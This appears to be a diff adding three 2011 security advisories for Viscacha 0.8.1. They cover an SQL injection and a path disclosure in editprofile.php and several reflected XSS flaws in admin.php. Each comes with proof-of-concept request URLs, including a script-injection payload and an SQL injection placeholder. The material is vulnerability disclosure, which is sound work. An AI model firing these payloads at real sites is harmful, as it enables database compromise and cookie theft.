@@ -1,0 +1,70 @@
+Vulnerability ID: HTB22921
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_viscacha.html
+Product: Viscacha
+Vendor: MaMo Net ( http://www.viscacha.org )
+Vulnerable Version: 0.8.1
+Vendor Notification: 24 March 2011
+Vulnerability Type: SQL Injection
+Risk level: High
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "editprofile.php" script to properly sanitize user-supplied input.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+[code]
+http://[host]/editprofile.php?action=abos2&digest[1'SQL_CODE_HERE]=1
+[/code]
+
+Vulnerability ID: HTB22919
+Reference: http://www.htbridge.ch/advisory/multiple_xss_in_viscacha.html
+Product: Viscacha
+Vendor: MaMo Net ( http://www.viscacha.org )
+Vulnerable Version: 0.8.1
+Vendor Notification: 24 March 2011
+Vulnerability Type: XSS (Cross Site Scripting)
+Risk level: Medium
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "admin.php" script to properly sanitize user-supplied input.
+User can execute arbitrary JavaScript code within the vulnerable application.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+[code]
+http://[host]/admin.php?action=designs&job=templates_file_history&file=<
+script>alert("XSS");</script>
+http://[host]/admin.php?action=designs&job=templates_file_revert&dir="<s
+cript>alert("XSS");</script>
+http://[host]/admin.php?action=designs&job=templates_file_edit2&dir="<sc
+ript>alert("XSS");</script>
+http://[host]/admin.php?action=designs&job=templates_file_delete&dir="<s
+cript>alert("XSS");</script>
+http://[host]/admin.php?action=explorer&job=newdir&path="<script>alert("
+XSS");</script>
+http://[host]//admin.php?action=explorer&job=chmod&path="<script>alert("
+XSS");</script>
+[/code]
+
+Vulnerability ID: HTB22920
+Reference: http://www.htbridge.ch/advisory/path_disclosure_in_viscacha.html
+Product: Viscacha
+Vendor: MaMo Net ( http://www.viscacha.org )
+Vulnerable Version: 0.8.1
+Vendor Notification: 24 March 2011
+Vulnerability Type: Path disclosure
+Risk level: Low
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "editprofile.php" script, it's possible to generate an error that will reveal the full path of the script.
+A remote user can determine the full path to the web root directory and other potentially sensitive information.
+
+The following PoC is available:
+
+[code]
+http://[host]/editprofile.php?action=addabo
+http://[host]/editprofile.php?action=removeabo
+[/code]
